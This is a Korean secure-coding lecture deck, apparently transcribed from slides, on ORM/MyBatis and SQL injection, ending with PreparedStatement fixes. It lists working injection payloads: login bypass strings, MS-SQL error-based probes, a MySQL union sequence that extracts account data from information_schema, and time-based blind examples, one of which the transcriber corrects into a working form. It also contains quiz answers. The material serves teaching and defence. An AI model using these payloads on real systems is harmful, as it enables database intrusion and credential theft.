- SQL Injection 방어 기능이 있지만, 잘못된 설정 시 보안 취약점 발생 가능.
- MyBatis는 SQL을 직접 작성하면서도 매핑을 자동화하여, 복잡한 쿼리 최적화에 유리.
- ORM & MyBatis를 활용할 때, 보안 및 성능 최적화를 고려한 설계가 필수.

---

## [2-SLIDES] 6주차 1차시 p.26 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 6주차 1차시 p.27 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 6주차 1차시 p.28 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**1. 다음 중 ORM(Object-Relational Mapping)의 주요 장점이 아닌 것은?**
- 1) 객체와 RDB간의 매핑을 자동화하여 개발 생산성을 높일 수 있음
- 2) SQL을 직접 만들지 않아도 CRUD 및 복잡한 쿼리 수행이 가능
- 3) 모든 SQL 최적화를 자동으로 수행하여 성능 문제 없음
- 4) 데이터베이스 종속성을 줄이고 유지보수를 용이하게 함

**2. MyBatis 프레임워크의 특징으로 적절한 것은?**
- 1) SQL 작성하지 않고 객체 조작만으로 DB 작업을 수행
- 2) SQL을 직접 작성하면서도 매핑 작업을 줄여 생산성을 높임
- 3) 완전한 객체-관계 매핑으로 DB 구조를 자동으로 변경 가능
- 4) 기본적으로 동적 SQL을 지원하지 않음

**3. ORM을 잘못 사용할 경우 발생할 수 있는 대표적인 보안 취약점 중 하나로, SQL 쿼리를 문자열 결합 방식으로 생성할 때 발생할 수 있는 공격 기법은 무엇인가?**

( &nbsp; &nbsp; &nbsp; &nbsp; )

---

## [2-SLIDES] 6주차 1차시 p.29 · 퀴즈 정답
퀴즈 정답
1. 다음 중 ORM(Object-Relational Mapping)의 주요 장점이 아닌 것은?
3) 모든 SQL 최적화를 자동으로 수행하여 성능 문제 없음
ORM은 자동 최적화 기능이 없으며, 복잡한 쿼리의 경우 성능 튜닝이 필요합니다.
2. MyBatis 프레임워크의 특징으로 적절한 것은?
2) SQL을 직접 작성하면서도 매핑 작업을 줄여 생산성을 높임
MyBatis는 ORM과 달리 SQL을 직접 작성해야 하지만, 매핑을 도와주는 기능을 제공하여 반복 작업을 줄이고 생산성
을 높입니다.
3. ORM을 잘못 사용할 경우 발생할 수 있는 대표적인 보안 취약점 중 하나로, SQL 쿼리를 문자열 결합 방식
으로 생성할 때 발생할 수 있는 공격 기법은 무엇인가?
( SQL Injection 또는 SQL 인젝션 )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[정답 표시: 1번 "3) 모든 SQL 최적화를 자동으로 수행하여 성능 문제 없음", 2번 "2) SQL을 직접 작성하면서도 매핑 작업을 줄여 생산성을 높임", 3번 "SQL Injection", "SQL 인젝션"이 빨간 글씨로 강조됨 (해설 문장은 검은 글씨)]

# [2-SLIDES] 6주차 2차시 — ORM·MyBatis / SQL 인젝션 / Command 인젝션
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · MyBatis/마이바티스/Mapper/매퍼/#{}/${}/동적 SQL · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SQLMap/에스큐엘맵 · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 6주차 2차시 p.1 · SQL 인젝션 진단 및 대응
SQL 인젝션 진단 및 대응
01 SQL 인젝션 개념과 발생 원리
02 SQL 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 2차시 p.2 · 학습 목표
학습 목표
SQL 인젝션 공격의 개념과 원리를 이해한다.
SQL 인젝션 공격의 다양한 기법을 학습하고 실습한다.
SQL 인젝션을 방어하기 위한 보안 기법을 적용할 수 있다.

---

## [2-SLIDES] 6주차 2차시 p.3 · 학습 내용
학습 내용
1. SQL 인젝션 개념 및 발생 원리
2. SQL 인젝션 공격 기법 이해
3. SQL 인젝션 대응 기법

---

## [2-SLIDES] 6주차 2차시 p.4 · SQL 인젝션 취약점 진단 및 대응
SQL 인젝션 취약점 진단 및 대응
01 SQL 인젝션 개념과 발생 원리
02 SQL 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 2차시 p.5 · SQL 인젝션 개요
SQL 인젝션 개요
개요
- 웹 애플리케이션에서 입력 받아 데이터베이스로 전달하는 정상적인 쿼리(CRUD)를 변조, 삽입하여
데이터베이스에 불법적인 데이터 열람, 시스템 명령 수행 등 비정상적인 데이터 베이스에 접근하는 기법.
- 모든 종류의 DBMS에 적용 가능한 공격 기법이며, 지속적으로 발전되고 있는 공격기법.
피해 내용
- 악성 스크립트 실행, 외부 프로그램 사용가능, DB 정보 열람,추가,수정,삭제 가능
- 프로시저를 통한 운영체제 명령어 수행, 불법 로그인 등의 침해 사고가 발생 가능

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[이미지] 오른쪽 하단 일러스트: 데이터베이스(원통형 디스크) 아이콘을 향해 주사기 바늘이 꽂히려는 그림, 아래에 파란 굵은 글씨 **SQL Injection** — SQL 인젝션을 DB에 '주입(injection)'하는 공격으로 형상화.

---

## [2-SLIDES] 6주차 2차시 p.6 · SQL 인젝션 개요
SQL 인젝션 개요

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: SQL 인젝션 공격 흐름 — 슬라이드 전체가 이미지]

- 좌측 상단: 웹 로그인 폼 화면 캡처
  - 상단 링크: `회원가입` | `아이디/비밀번호 찾기`
  - 아이디 입력란: `WIRESHARK`
  - 비밀번호 입력란: `'a'or'1=1'`
  - [로그인] 버튼, □ 로그인 상태 유지 (체크박스)
  - 오른쪽: `IP보안 ON`(ON은 초록색 밑줄), [일회용 로그인] 버튼
- 공격자(선글라스 쓴 인물 + 노트북) 아래 검은 상자 — 공격 패턴 문자열:
  ```
  'or 1=1--
  Admin' --
  'or 1=1#
  ```
  캡션: "공격 패턴 문자열로 쿼리문 조작" (상자에서 공격자 쪽으로 위쪽 화살표)
  (※ 원문 표기 그대로 — 캡처 속 따옴표가 둥근 따옴표 ‘ ’로 표시됨. 실제 페이로드는 ASCII 작은따옴표 `'`)
- 흐름:
  - 공격자 → **① 조작된 Request** → 웹 서버
  - 웹 서버 → **② DB 쿼리 실행** → 데이터베이스
  - 웹 서버 → **③ 공격 결과** → 공격자
- 웹 서버 위 말풍선(빨간 점선 구름): "인가되지 않은 사용자가 DB 데이터를 무단 조작 하거나 삭제."
- 데이터베이스 옆 말풍선(파란 구름): "조작된 SQL 쿼리 실행"

(※ 검증: Python(sqlite3)으로 확인 — 일치) `select * from m where id='' or 1=1--' and pw='x'` → `--` 뒤가 주석 처리되어 전체 행 반환. `Admin' --` → `id='Admin' --' and pw=...` → 비밀번호 검사 생략. `'or 1=1#`는 MySQL에서 `#`이 주석이라 동일 효과(SQLite 등에서는 `#` 미지원으로 오류).
비밀번호란 값이 `a'or'1=1`(바깥 따옴표는 쿼리의 따옴표)이면 `pw='a'or'1=1'` → 문자열 `'1=1'`이 숫자 1(참)로 평가되어 전체 행 반환(SQLite로 확인, MySQL도 같은 형 변환 규칙). 입력값 자체에 바깥 따옴표까지 넣은 `'a'or'1=1'`을 그대로 결합하면 `pw=''a'or'1=1''` 구문 오류.

---

## [2-SLIDES] 6주차 2차시 p.7 · SQL 인젝션 취약점 발생 원인
SQL 인젝션 취약점 발생 원인
1. 동적 쿼리에서 사용자 입력 검증 부족
- 폼, URL 파라미터, API 요청 등 모든 외부 입력에 대해 검증 로직이 없는 경우 발생
- 입력 값 내 특수문자(' , ", ; 등)를 처리하지 않아 SQL 구문이 의도치 않게 변경됨
아래 SQL 문에서 userInput에 admin' OR '1'='1 을 삽입하면 항상 참이 되어 인증 우회됨
"SELECT * FROM users WHERE username = '" + userInput + “’;”

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 삽입 값 `admin' OR '1'='1`은 굵은 고정폭 글꼴, SQL 문은 테두리 상자 안 고정폭 글꼴.

(※ 검증: Python(sqlite3)으로 확인 — 일치) 최종 쿼리:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1';
```
→ `OR '1'='1'`이 항상 참이므로 users 전체 행 반환(테스트 DB 2행 모두 반환) → 인증 우회.
(※ 원문 표기 그대로 — 상자 끝 `“’;”`가 둥근 따옴표로 되어 있음. Java 문자열로는 `"';"`(작은따옴표+세미콜론)여야 컴파일됨.)

---

## [2-SLIDES] 6주차 2차시 p.8 · SQL 인젝션 취약점 발생 원인
SQL 인젝션 취약점 발생 원인
2. 에러 메시지 및 정보 노출
- 애플리케이션에서 내부 에러 메시지 및 데이터베이스 정보를 노출할 경우, 공격자가 이를 분석하여 추가 공격을 설계할 수 있음.
- 에러 메시지에 포함된 내용으로 다양한 정보 획득 가능
→ SQL 구문 오류, 테이블명, 컬럼 명, DB 버전 등
아래 SQL 문에서 userInput에 1' AND db_name() = 0-- 삽입하면 에러 메시지에 데이터베이스 이름이 드러남.
"SELECT * FROM users WHERE username = '" + userInput + “’;”

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 삽입 값 `1' AND db_name() = 0--`은 굵은 고정폭 글꼴, SQL 문은 테두리 상자 안.

최종 쿼리 (※ 검증: Python으로 문자열 생성 확인 — 일치):
```sql
SELECT * FROM users WHERE username = '1' AND db_name() = 0--';
```
→ `--` 뒤의 `';`는 주석 처리. MS-SQL에서 `db_name()`은 nvarchar(문자열)를 반환하므로 정수 0과 비교할 때 형 변환 오류(“Conversion failed when converting the nvarchar value '<DB이름>' to data type int”)가 나며, 이 오류 메시지에 현재 DB 이름이 노출됨. (MS-SQL 전용 동작이라 Python에서 실행 검증은 불가 — 원리상 내용 일치)
(※ 원문 표기 그대로 — 상자 끝 `“’;”` 둥근 따옴표, p.7과 동일)

---

## [2-SLIDES] 6주차 2차시 p.9 · SQL 인젝션 취약점 발생 원인
SQL 인젝션 취약점 발생 원인
3. 권한 및 보안 설정 미흡
- 애플리케이션에서 사용하는 DB 계정이 불필요한 권한(예: DROP, ALTER, EXECUTE 등)을 가지고 있을 경우,
공격자가 이를 악용할 수 있음.
- 취약한 저장 프로시저를 통해 시스템 명령어 실행이나 추가 권한 상승 공격이 가능.

---

## [2-SLIDES] 6주차 2차시 p.10 · SQL 인젝션 취약점 공격 방식
SQL 인젝션 취약점 공격 방식
HTML
Java
입력 예
정상 요청 : login.jsp?id=gildong&password=gdhong
공격 코드 : login.jsp?id=a' or 'a'='a&password=a' or 'a'='a
login.jsp?id=admin' -- &password=x
login.jsp?id=admin' # &password=x

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 이미지 — 추출 텍스트에 없음] 파란 상자 2개를 아래 화살표로 연결(HTML 폼 → Java 처리 코드).

HTML (상자 오른쪽 위 'HTML' 표시):
```html
<form action="login.jsp">
   ID : <input type="text" name="id" />
   Password : <input type="password" name="password" />
</form>
```
↓

Java (상자 오른쪽 위 'Java' 표시):
```java
String sql = "select * from member where id = '" + request.getParameter("id") + "' "
             + "and password = '" + request.getParameter("password") + "' ";
statement.executeQuery(sql);
```
(판독 확신 낮음 — 이미지 글꼴 특성상 `getParameter[...]`, `executeQuery[sql]`처럼 대괄호로 보이나 Java 문법상 소괄호로 판독)

입력 예의 요청 URL은 굵은 고정폭 글꼴.

최종 쿼리 (※ 검증: Python(sqlite3)으로 정상·공격1·공격2 실행 — 일치):
- 정상: `select * from member where id = 'gildong' and password = 'gdhong' ` → gildong 1행
- 공격1: `select * from member where id = 'a' or 'a'='a' and password = 'a' or 'a'='a' ` → AND가 OR보다 우선 → `id='a' OR ('a'='a' AND password='a') OR 'a'='a'` → 항상 참 → 전체 행
- 공격2: `select * from member where id = 'admin' -- ' and password = 'x' ` → `--` 이후 주석, 비밀번호 검사 없이 admin 행 반환
- 공격3: `select * from member where id = 'admin' # ' and password = 'x' ` → MySQL에서 `#`은 한 줄 주석 → 공격2와 같은 효과
(참고: 실제 브라우저 URL에서 `#`은 프래그먼트 시작 문자라 서버로 전송되지 않으므로 `%23`으로, 공백은 `%20`/`+`로 인코딩해야 함. MySQL의 `-- ` 주석은 뒤에 공백이 필요.)

---

## [2-SLIDES] 6주차 2차시 p.11 · Error-based SQL 인젝션 (오류 기반 SQL 인젝션)
Error-based SQL 인젝션 (오류 기반 SQL 인젝션)
추가 공격에 필요한 정보가 오류 메시지에 포함되어 노출될 수 있도록 입력 값을 조작
공격 방식 예시
- ' ➔ 1개의 따옴표. 인젝션 가능 여부 및 에러 메시지 내용 확인이 가능
- ' having 1 = 1 -- ➔ 오류에서 테이블명, 컬럼 명 확인이 가능
- ' and db_name() = 1 -- ➔ 현재 데이터베이스의 이름 확인이 가능
- ' and 1 = (select @@version) -- ➔ 현재 설치된 SQL Server의 시스템 및 빌드 정보 확인이 가능

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 공격 문자열은 굵은 고정폭 글꼴, ➔ 화살표로 오른쪽 설명과 연결. 첫 항목은 작은따옴표 하나(`'`).

(※ 검증: MS-SQL 전용 동작이라 Python 실행 검증 불가 — 원리상 내용 일치)
- `' having 1 = 1 --` : GROUP BY 없이 HAVING 사용 → “Column 'users.id' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.” 형태 오류에 `테이블명.컬럼명` 노출
- `' and db_name() = 1 --` : nvarchar → int 형 변환 오류 메시지에 DB 이름 노출 (p.8과 같은 원리, 비교값만 0/1 차이)
- `' and 1 = (select @@version) --` : `@@version` 문자열을 int로 변환하다 오류 → 메시지에 SQL Server 버전·빌드·OS 정보 노출

---

## [2-SLIDES] 6주차 2차시 p.12 · Union-based SQL 인젝션 (유니온 기반 SQL 인젝션)
Union-based SQL 인젝션 (유니온 기반 SQL 인젝션)
조회 결과를 출력하는 사용자 화면에, 원래 화면 출력을 위한 쿼리와 공격자가 알고자 하는 정보를 조회하는 쿼리를
조인한 결과가 출력되도록 입력 값을 조작
공격 방식 예시
- admin' union select 1,2,3,4,5,6 #
- admin' union select version(),2,3,4,5,6 #
- admin' union select schema_name,2,3,4,5,6 from information_schema.schemata #
- admin' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where
table_schema=database() #
- admin' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where
table_name='board_member' #
- admin' union select idx,userid,userpw,username,5,6 from board_member #

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 페이로드 전체가 굵은 고정폭 글꼴.

(※ 검증: Python으로 확인 — 일치) 각 페이로드를 `select * from board_member where userid='` + 입력 + `'`에 넣으면 `#` 앞까지 작은따옴표 짝이 맞고, 원래 쿼리 끝의 `'`는 MySQL `#` 주석으로 무시됨. 6개 예시 모두 UNION SELECT 컬럼 수가 6개로 일치(원 쿼리 컬럼 수가 6이라는 전제 — 첫 예시 `1,2,3,4,5,6`으로 컬럼 수와 화면 출력 위치 확인).
예: `select * from board_member where userid='admin' union select idx,userid,userpw,username,5,6 from board_member #'`
`version()`, `database()`, `group_concat()`, `information_schema` → MySQL 문법. 순서: 컬럼 수 확인 → DB 버전 → 스키마 목록 → 현재 DB 테이블 목록 → board_member 컬럼 목록 → 계정 데이터 추출.

---

## [2-SLIDES] 6주차 2차시 p.13 · Union-based SQL 인젝션 (유니온 기반 SQL 인젝션)
Union-based SQL 인젝션 (유니온 기반 SQL 인젝션)
주요 DBMS별 시스템 테이블

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[표 이미지 — 추출 텍스트에 없음] 주요 DBMS별 시스템 테이블 (머리글 파란 배경)

| DBMS | 테이블 | 비고 |
|---|---|---|
| MS-SQL | sysdatabases (sys.databases) / sysobjects (sys.objects) / syscolumns (sys.columns) / systypes (sys.types) / sysusers (sys.database_pricipals) | http://technet.microsoft.com/ko-kr/library/ms187997.aspx |
| Oracle | SYS.ALL_OBJECTS / SYS.DBA_OBJECTS / SYS.USER_OBJECTS / SYS.TABLES / SYS.ALL_TABLES / SYS.DBA_TABLES / SYS.USER_TABLES / SYS.COLUMNS | http://docs.oracle.com/cd/E21901_01/doc/timesten.1122/e21644/systemtables.htm |
| MySQL | INFORMATION_SCHEMA.SCHEMATA / INFORMATION_SCHEMA.TABLES / INFORMATION_SCHEMA.COLUMNS | https://dev.mysql.com/doc/refman/5.7/en/information-schema.html |

(※ 원문 표기 그대로 — `sys.database_pricipals`는 `sys.database_principals`의 오타)
(참고: Oracle URL은 TimesTen 11.2.2 문서의 시스템 테이블 목록이라 `SYS.TABLES`, `SYS.COLUMNS` 등은 TimesTen 기준 이름임. 일반 Oracle DB에서는 `ALL_TABLES`, `ALL_TAB_COLUMNS`, `USER_TABLES` 등을 주로 사용)

---

## [2-SLIDES] 6주차 2차시 p.14 · Blind SQL 인젝션 (블라인드 SQL 인젝션)
Blind SQL 인젝션 (블라인드 SQL 인젝션)
쿼리 실행 결과에 따라 서버의 반응이 다른 것을 이용한 공격
공격자가 알고자 하는 정보의 존재 여부를 확인하기 위해
참인 조건(쿼리 실행 결과가 존재)과 거짓인 조건(쿼리 실행 결과가 없음)을 번갈아 가면서 입력되도록 입력 값을 조작
Content-based 방식과 Time-based 방식이 있음
공격방식 예시
Data' and substring(user_name(1),1,1)='a' -- // a~z까지 첫번째 글자를 비교
Data' and substring(user_name(1),2,1)='a' -- // 응답 내용의 길이를 가지고 판단
또는
Data' and substring(user_name(1),1,1)='a' waitfor delay '0:0:5' // 시간 지연을 가지고 판단.
. . . . 지속적으로 반복. 공격시간이 많이 걸리므로 툴에 의해 자동화 공격을 시도한다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 공격 예시 3줄과 마지막 줄은 고정폭 글꼴, 오른쪽에 `//` 주석.

(※ 검증: Python으로 따옴표 짝 확인 — 1·2번째 예시 일치, 3번째 예시는 불일치)
- `select * from t where c='Data' and substring(user_name(1),1,1)='a' --'` → 따옴표 짝 맞음, `--` 뒤 주석
- 3번째(Time-based) 예시는 끝에 `--`가 없어 원래 쿼리의 닫는 `'`가 남음 → `... waitfor delay '0:0:5''` 따옴표 짝 불일치(구문 오류 가능).
- 또한 MS-SQL에서 `WAITFOR DELAY`는 조건식이 아닌 별도 문장이므로 위 형태로는 조건부 지연이 되지 않음. 조건부 지연은 보통 `Data'; IF (substring(user_name(1),1,1)='a') WAITFOR DELAY '0:0:5'--` 형태로 작성.
- `user_name(1)`, `substring`, `waitfor delay` → MS-SQL 문법(`user_name(1)`은 사용자 ID 1, 보통 `dbo`).

---

## [2-SLIDES] 6주차 2차시 p.15 · SQL 인젝션 공격 보안 사고 사례
SQL 인젝션 공격 보안 사고 사례

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[화면 캡처 2개 — 언론 기사, 추출 텍스트에 없음]

① 왼쪽: 데일리시큐 기사 캡처
- 상단 메뉴: 이슈 | 산업 | 정책 | 해외 | IT&생활 | 자료실 | 전체기사 / 최종편집 : 2025-02-16 19:45 (일)
- 제목: **여기어때, SQL 인젝션 공격 통해 회원정보 탈취 당해**
- 길민권 기자 | 승인 2017.04.26 18:13
- 부제: 민관합동조사단, “홈페이지 취약점 공격으로 개인정보 유출 발생”
- 도식(캡션 '▲ 여기어때 해킹 과정 개요'): 공격자 ↔ [위드이노베이션: (마케팅 센터 웹서버), (서비스 관리 웹서버)] ↔ DB서버
  - ① SQL-인젝션(취약점 수집) → 마케팅 센터 웹서버 ↔ DB서버: 취약점 조회
  - ② SQL-인젝션(세션값 탈취) → 마케팅 센터 웹서버 ↔ DB서버: 세션값 조회
  - ③ 세션변조(관리자우회접속) → 서비스 관리 웹서버
  - ③ 세션변조(정보조회·유출) ← 서비스 관리 웹서버 ↔ DB서버: 개인정보 조회
  - (※ 원문 표기 그대로 — 도식에 ③이 두 번 나옴. 네 번째 단계는 ④로 보임)
- 본문 요지(저작권상 요약): 방통위·미래부가 3월 7일~17일 발생한 위드이노베이션 '여기어때' 개인정보 유출 침해사고에 대한 민관합동조사단 조사 결과를 발표. 이용고객에게 총 4,817건의 협박성 음란문자(SMS)가 발송된 사고의 원인 분석과 재발 방지를 위한 조사.

② 오른쪽: 보안뉴스(시큐리티월드) 기사 캡처
- 상단: 로그인 | 회원가입 | 기사제보 | 스크랩, 통합검색 / 메뉴: #전체기사 #시큐리티월드 #사건사고 #보안리포트 #사이버안보 #AI 보안, 뉴스레터 신청, 시큐리티 콘텐츠
- Home > 전체기사
- 제목: **한국직업능력교육원, 해킹으로 개인정보 유출... 이름, 전화번호 등 4개 항목**
- 입력 : 2024-09-10 11:39
- 본문 요지(저작권상 요약): K테크에듀는 1999년 열린직업전문학교로 설립, 시흥·안산·군포(안양)·인천 4개 지점, 교직원 80여 명. 익스플로잇랩스 대표는 해킹에 의한 유출에 완벽한 대응책이 없는 것이 근본 문제이며 이번 사고는 SQL 인젝션으로 발생한 것으로 보인다고 언급, 텔레그램 유출 데이터의 진위 파악에 관한 의견도 덧붙임.
- **빨간 박스 강조**: "SQL 인젝션을 통해 사고가 발생"

---

## [2-SLIDES] 6주차 2차시 p.16 · SQL 인젝션 취약점 진단 및 대응
SQL 인젝션 취약점 진단 및 대응
01 SQL 인젝션 개념과 발생 원리
02 SQL 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 2차시 p.17 · SQL인젝션 취약점 진단 방법 – 코드리뷰
SQL인젝션 취약점 진단 방법 – 코드리뷰
코드 리뷰란?
- 개발자가 작성한 소스 코드를 체계적으로 검토하여 버그 및 보안 취약점을 찾아내는 프로세스
- SQL 인젝션과 같은 취약점은 코드 리뷰를 통해 조기에 발견할 수 있음
SQL 인젝션 취약점의 주요 원인
- 동적 SQL 사용: 사용자 입력 값을 문자열로 직접 쿼리에 삽입
- 입력 값 검증 미흡: 사용자 입력에 대한 필터링 또는 이스케이핑이 부족
- 잘못된 권한 설정: 데이터베이스 접근 권한이 과도하게 부여됨
코드 리뷰의 중요성
- 보안 취약점이 제품 출시 전 단계에서 사전에 제거됨
- 팀 내 보안 인식 제고 및 모범 사례 공유
- 자동화 도구와 수동 리뷰를 병행하여 취약점 탐지율 향상

---

## [2-SLIDES] 6주차 2차시 p.18 · SQL인젝션 취약점 진단 방법 – 코드리뷰
SQL인젝션 취약점 진단 방법 – 코드리뷰
1. 동적 SQL 구문 사용 여부 점검
사용자 입력 값을 직접 쿼리 문자열에 결합하는 경우
public User findUserByUsername(String username) {
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
try {
return jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<>(User.class));
} catch (EmptyResultDataAccessException e) {
return null;
}
}
2. 입력 값 검증 및 이스케이핑 점검
- 사용자 입력 값에 대해 화이트리스트 기반의 유효성 검증 수행
- 특수문자나 위험 문자에 대한 이스케이핑 적용 여부 확인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 코드가 테두리 상자 안 고정폭 글꼴, `String sql = "SELECT * FROM users WHERE username = '" + username + "'";` 줄은 굵게 강조(Spring `JdbcTemplate` 사용 코드).

(※ 검증: Python(sqlite3)으로 확인 — 일치) username에 `' OR '1'='1` 입력 시 `SELECT * FROM users WHERE username = '' OR '1'='1'` → 전체 행 반환. (참고: `queryForObject`는 결과가 2행 이상이면 `IncorrectResultSizeDataAccessException`을 던지지만, 쿼리 자체는 조작됨. 안전한 형태는 `jdbcTemplate.queryForObject("SELECT * FROM users WHERE username = ?", new BeanPropertyRowMapper<>(User.class), username)`처럼 `?` 바인딩)

---

## [2-SLIDES] 6주차 2차시 p.19 · SQL인젝션 취약점 진단 방법 – 자동화된 진단 도구 활용
SQL인젝션 취약점 진단 방법 – 자동화된 진단 도구 활용
정적 분석 도구
소스 코드를 분석하여 보안 취약점(예: 동적 SQL, 입력값 처리 미흡 등)을 자동으로 탐지
예) SonarQube, Checkmarx, Fortify
동적 분석 도구
실행 중인 애플리케이션에 대해 실제 공격 시나리오(예: OWASP ZAP)를 적용해 취약점 검증
예) OWASP ZAP
자동화 도구의 필요성
- 광범위한 코드 검증: 수동 리뷰만으로는 놓치기 쉬운 취약점을 체계적으로 탐지
- 반복적 검사: CI/CD 파이프라인에 통합하여 코드 변경 시마다 자동 점검
SQL 인젝션 취약점 탐지 역할
- 사용자 입력과 동적 SQL 구문 조합을 자동으로 스캔하여 위험 패턴을 식별
- 취약한 코드 패턴(예: 문자열 결합으로 SQL 생성)을 보고서로 제공

---

## [2-SLIDES] 6주차 2차시 p.20 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 6주차 2차시 p.20 · 취약성을 가지는 쿼리구조 - 동적 쿼리

[흐름도 — 위에서 아래로 화살표]

1. `String id=request.getParameter(“id”);`
2. ↓ `String sql=“select * from tbl where id=“+id;` (주황색 강조 상자)
3. ↓ JDBC API Statement 명령어 생성
4. ↓ 쿼리 실행

(2번 상자를 가리키는 말풍선)
외부 입력 값이 삽입된 뒤,
쿼리 명령문이 만들어지는 구조이므로,
외부 입력 값에 따라 쿼리명령문이 수정될 수 있음.

(※ 원문 표기 그대로 — 둥근 따옴표 “ ” 사용. 실제 Java 코드라면 `String sql = "select * from tbl where id=" + id;`)
(※ 검증: Python(sqlite3)으로 확인 — 일치) id가 따옴표 없이 결합되므로(숫자형 컬럼 가정) id에 `1 or 1=1` 입력 시 `select * from tbl where id=1 or 1=1` → 전체 행 반환.

---

## [2-SLIDES] 6주차 2차시 p.21 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 6주차 2차시 p.21 · 취약성을 가지지 않는 쿼리구조 - 동적 쿼리

(※ 원문 표기 그대로 — 안전한 구조인데도 소제목이 '동적 쿼리'로 되어 있음. 내용상 파라미터화(정적 구조) 쿼리에 해당)

[흐름도 — 위에서 아래로 화살표]

1. `String id=request.getParameter(“id”);`
2. ↓ JDBC API PreparedStatement 명령어 생성
   `prepareStatement(“select * from tbl where id=?”);`
3. ↓ `setString(1,id)` (회색 강조 상자)
4. ↓ 쿼리 실행

(2~3번 사이를 가리키는 말풍선)
쿼리명령문이 만들어지고 난 다음, 외부입력
값이 자료형에 맞게 삽입되어
외부입력값에 의해 명령어 구조가 변경되지
않음

(※ 원문 표기 그대로 — 둥근 따옴표 “ ” 사용)
(※ 검증: Python(sqlite3)으로 확인 — 일치) 같은 입력 `1 or 1=1`을 `?`에 바인딩하면 하나의 값으로만 취급되어 0행 반환(쿼리 구조 불변).

---

## [2-SLIDES] 6주차 2차시 p.22 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
Statement 방식 DB Query
안전하지 않은 코드
String query = "SELECT * FROM users WHERE userid ='"+ userid + "'" +
“AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
안전한 코드
String query = "SELECT * FROM users WHERE userid=? AND password=?”;
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
PreparedStatement 의 setXXX()메소드로 외부 입력 데이터를 쿼리문에 설정하여 쿼리 구조가 변조되는 것을 방지한다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
